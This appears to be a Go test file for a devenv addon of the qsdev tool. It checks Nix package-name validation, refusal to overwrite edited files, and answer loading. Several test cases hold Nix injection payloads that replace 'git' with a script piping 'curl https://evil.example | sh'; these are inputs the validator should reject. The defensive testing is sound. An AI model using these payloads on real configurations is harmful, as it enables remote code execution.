package devenv_test

import (
	"bytes"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/addons/devenv"
	"github.com/Quantum-Serendipity/qsdev/internal/answers"
	"github.com/Quantum-Serendipity/qsdev/internal/state"
	"github.com/Quantum-Serendipity/qsdev/pkg/types"
)

// Relative state file paths, indexed as in state.StateFilePaths.
var (
	initStateRel   = state.StateFilePaths()[0]
	devenvStateRel = state.StateFilePaths()[1]
)

// runDevenv executes the devenv command tree with args and returns its
// combined output and error.
func runDevenv(t *testing.T, args ...string) (string, error) {
	t.Helper()
	cmd := devenv.ExportDevenvCmd()
	var buf bytes.Buffer
	cmd.SetOut(&buf)
	cmd.SetErr(&buf)
	cmd.SetArgs(args)
	err := cmd.Execute()
	return buf.String(), err
}

// initProject runs `devenv init --lang go --yes` in a fresh temp directory and
// returns the project root.
func initProject(t *testing.T) string {
	t.Helper()
	tmpDir := t.TempDir()
	chdir(t, tmpDir)
	if out, err := runDevenv(t, "init", "--lang", "go", "--yes"); err != nil {
		t.Fatalf("init failed: %v\n%s", err, out)
	}
	return tmpDir
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("writing %s: %v", path, err)
	}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("reading %s: %v", path, err)
	}
	return string(data)
}

func TestValidateNixPackageName(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		pkg     string
		wantErr bool
	}{
		{"simple", "jq", false},
		{"dashed", "gcc-unwrapped", false},
		{"attr path", "python3Packages.requests", false},
		{"leading underscore", "_7zz", false},
		{"prime", "foo'", false},
		{"empty", "", true},
		{"whitespace", "foo bar", true},
		{"or injection", `nonexistent or (pkgs.writeShellScriptBin "git" "curl https://x | sh")`, true},
		{"list terminator", "foo]", true},
		{"interpolation", "${builtins.exec}", true},
		{"quoted attr", `nodePackages."@angular/cli"`, true},
		{"semicolon", "a;b", true},
		{"leading digit", "7zz", true},
		{"empty segment", "a..b", true},
		{"trailing dot", "a.", true},
		{"keyword", "or", true},
		{"keyword segment", "foo.in", true},
		{"with keyword", "with", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := devenv.ExportValidateNixPackageName(tt.pkg)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateNixPackageName(%q) error = %v, wantErr %v", tt.pkg, err, tt.wantErr)
			}
		})
	}
}

func TestAddPackageCmd_RejectsNixInjection(t *testing.T) {
	root := initProject(t)
	nixBefore := readFile(t, filepath.Join(root, "devenv.nix"))

	payload := `nonexistent or (pkgs.writeShellScriptBin "git" "curl https://evil.example | sh")`
	_, err := runDevenv(t, "add-package", payload)
	if err == nil {
		t.Fatal("expected add-package to reject a Nix expression as a package name")
	}
	if !strings.Contains(err.Error(), "invalid package name") {
		t.Errorf("error = %v, want invalid package name", err)
	}

	if got := readFile(t, filepath.Join(root, "devenv.nix")); got != nixBefore {
		t.Error("devenv.nix changed after a rejected add-package")
	}
	a, err := devenv.ExportLoadAnswers(root)
	if err != nil {
		t.Fatalf("loading answers: %v", err)
	}
	if len(a.ExtraPackages) != 0 {
		t.Errorf("ExtraPackages = %v, want none", a.ExtraPackages)
	}
}

func TestGenerateDevenvNix_RejectsTamperedExtraPackages(t *testing.T) {
	t.Parallel()
	reg := newTestRegistry(t)
	a := types.WizardAnswers{
		ExtraPackages: []string{`jq ] ++ [ (pkgs.writeShellScriptBin "git" "id")`},
	}
	if _, err := devenv.GenerateDevenvNix(a, reg); err == nil {
		t.Fatal("expected GenerateDevenvNix to reject an invalid extra package")
	}
}

func TestAddPackageCmd_WriteFailureIsNotSuccess(t *testing.T) {
	root := initProject(t)

	stBefore, err := state.LoadStateFromFile(filepath.Join(root, devenvStateRel))
	if err != nil {
		t.Fatalf("loading state: %v", err)
	}
	yamlEntry, ok := stBefore.Files["devenv.yaml"]
	if !ok {
		t.Fatal("init should record devenv.yaml in state")
	}

	// Replace devenv.yaml with a non-empty directory so the atomic rename
	// over it fails inside WriteFiles.
	yamlPath := filepath.Join(root, "devenv.yaml")
	if err := os.Remove(yamlPath); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(yamlPath, "blocker"), 0o755); err != nil {
		t.Fatal(err)
	}

	_, err = runDevenv(t, "add-package", "jq", "--force")
	if err == nil {
		t.Fatal("expected add-package to fail when a generated file cannot be written")
	}
	if !strings.Contains(err.Error(), "devenv.yaml") {
		t.Errorf("error should name the failed file, got: %v", err)
	}

	a, err := devenv.ExportLoadAnswers(root)
	if err != nil {
		t.Fatalf("loading answers: %v", err)
	}
	if slices.Contains(a.ExtraPackages, "jq") {
		t.Error("answers must not record a change whose files failed to write")
	}

	stAfter, err := state.LoadStateFromFile(filepath.Join(root, devenvStateRel))
	if err != nil {
		t.Fatalf("loading state: %v", err)
	}
	if got, ok := stAfter.Files["devenv.yaml"]; !ok || got.Hash != yamlEntry.Hash {
		t.Errorf("state entry for failed devenv.yaml = %+v (present %v), want previous entry kept", got, ok)
	}
}

func TestAddPackageCmd_RefusesToOverwriteModifiedFiles(t *testing.T) {
	root := initProject(t)

	envrcPath := filepath.Join(root, ".envrc")
	userEnvrc := "use devenv\ndotenv_if_exists\n"
	writeFile(t, envrcPath, userEnvrc)
	yamlPath := filepath.Join(root, "devenv.yaml")
	userYAML := readFile(t, yamlPath) + "\n# user edit\n"
	writeFile(t, yamlPath, userYAML)

	_, err := runDevenv(t, "add-package", "jq")
	if err == nil {
		t.Fatal("expected add-package to refuse overwriting a modified generated file")
	}
	if !strings.Contains(err.Error(), "devenv.yaml") || !strings.Contains(err.Error(), "--force") {
		t.Errorf("error should name devenv.yaml and suggest --force, got: %v", err)
	}
	if got := readFile(t, yamlPath); got != userYAML {
		t.Error("devenv.yaml was overwritten without --force")
	}

	if out, err := runDevenv(t, "add-package", "jq", "--force"); err != nil {
		t.Fatalf("add-package --force failed: %v\n%s", err, out)
	}
	if got := readFile(t, yamlPath); got == userYAML {
		t.Error("--force should overwrite the modified devenv.yaml")
	}
	// .envrc uses the Skip strategy: an existing copy is never overwritten.
	if got := readFile(t, envrcPath); got != userEnvrc {
		t.Errorf(".envrc = %q, want user content preserved", got)
	}
}

func TestRemovePackageCmd_RefusesToOverwriteModifiedFiles(t *testing.T) {
	root := initProject(t)
	if out, err := runDevenv(t, "add-package", "jq"); err != nil {
		t.Fatalf("add-package failed: %v\n%s", err, out)
	}

	yamlPath := filepath.Join(root, "devenv.yaml")
	userYAML := readFile(t, yamlPath) + "\n# user edit\n"
	writeFile(t, yamlPath, userYAML)

	if _, err := runDevenv(t, "remove-package", "jq"); err == nil {
		t.Fatal("expected remove-package to refuse overwriting a modified generated file")
	}
	if got := readFile(t, yamlPath); got != userYAML {
		t.Error("devenv.yaml was overwritten without --force")
	}
	if out, err := runDevenv(t, "remove-package", "jq", "--force"); err != nil {
		t.Fatalf("remove-package --force failed: %v\n%s", err, out)
	}
}

func TestAddPackageCmd_AcceptsFilesRewrittenByInitLifecycle(t *testing.T) {
	root := initProject(t)

	// Simulate `qsdev enable`, which regenerates devenv.nix through the devinit
	// lifecycle and records it in the init state file, not the devenv one.
	nixPath := filepath.Join(root, "devenv.nix")
	rewritten := readFile(t, nixPath) + "\n# regenerated by qsdev enable\n"
	writeFile(t, nixPath, rewritten)
	initState := state.RecordFiles([]types.GeneratedFile{{Path: "devenv.nix", Content: []byte(rewritten)}})
	if err := state.SaveStateToFile(filepath.Join(root, initStateRel), initState); err != nil {
		t.Fatal(err)
	}

	if out, err := runDevenv(t, "add-package", "jq"); err != nil {
		t.Fatalf("add-package should accept a file matching another qsdev state record: %v\n%s", err, out)
	}
}

func TestAddPackageCmd_ForceRegeneratesExistingPackage(t *testing.T) {
	initProject(t)
	if out, err := runDevenv(t, "add-package", "jq"); err != nil {
		t.Fatalf("add-package failed: %v\n%s", err, out)
	}

	if _, err := runDevenv(t, "add-package", "jq"); err == nil || !strings.Contains(err.Error(), "no new packages") {
		t.Errorf("duplicate add without --force: err = %v, want 'no new packages'", err)
	}

	out, err := runDevenv(t, "add-package", "jq", "--force")
	if err != nil {
		t.Fatalf("add-package jq --force should regenerate, got: %v\n%s", err, out)
	}
	if !strings.Contains(out, "regenerated") {
		t.Errorf("output should report regeneration, got: %s", out)
	}
}

func TestAddPackageCmd_PreservesChangesFromEnable(t *testing.T) {
	root := initProject(t)

	// Simulate `qsdev enable gitleaks`, which saves only the primary answers.
	primary, err := answers.LoadPrimary(root)
	if err != nil {
		t.Fatal(err)
	}
	if primary.EnabledTools == nil {
		primary.EnabledTools = map[string]bool{}
	}
	primary.EnabledTools["gitleaks"] = true
	if err := answers.SavePrimary(root, primary); err != nil {
		t.Fatal(err)
	}

	if out, err := runDevenv(t, "add-package", "jq"); err != nil {
		t.Fatalf("add-package failed: %v\n%s", err, out)
	}

	after, err := answers.LoadPrimary(root)
	if err != nil {
		t.Fatal(err)
	}
	if !after.EnabledTools["gitleaks"] {
		t.Error("add-package reverted a tool enabled through the primary answers file")
	}
	if !slices.Contains(after.ExtraPackages, "jq") {
		t.Errorf("ExtraPackages = %v, want jq", after.ExtraPackages)
	}
}

func TestLoadAnswers_Sources(t *testing.T) {
	t.Parallel()
	primaryOnly := types.WizardAnswers{ProjectName: "primary"}
	legacyOnly := types.WizardAnswers{ProjectName: "legacy"}

	tests := []struct {
		name      string
		primary   *types.WizardAnswers
		legacy    *types.WizardAnswers
		wantName  string
		wantError bool
	}{
		{"primary wins over stale legacy copy", &primaryOnly, &legacyOnly, "primary", false},
		{"primary without legacy copy (fresh clone)", &primaryOnly, nil, "primary", false},
		{"legacy copy only (older release)", nil, &legacyOnly, "legacy", false},
		{"neither", nil, nil, "", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := t.TempDir()
			if tt.primary != nil {
				if err := answers.SavePrimary(root, *tt.primary); err != nil {
					t.Fatal(err)
				}
			}
			if tt.legacy != nil {
				if err := answers.SaveToDir(root, ".devenv", ".qsdev-answers.yaml", *tt.legacy); err != nil {
					t.Fatal(err)
				}
			}
			got, err := devenv.ExportLoadAnswers(root)
			if (err != nil) != tt.wantError {
				t.Fatalf("loadAnswers error = %v, wantError %v", err, tt.wantError)
			}
			if got.ProjectName != tt.wantName {
				t.Errorf("ProjectName = %q, want %q", got.ProjectName, tt.wantName)
			}
		})
	}
}
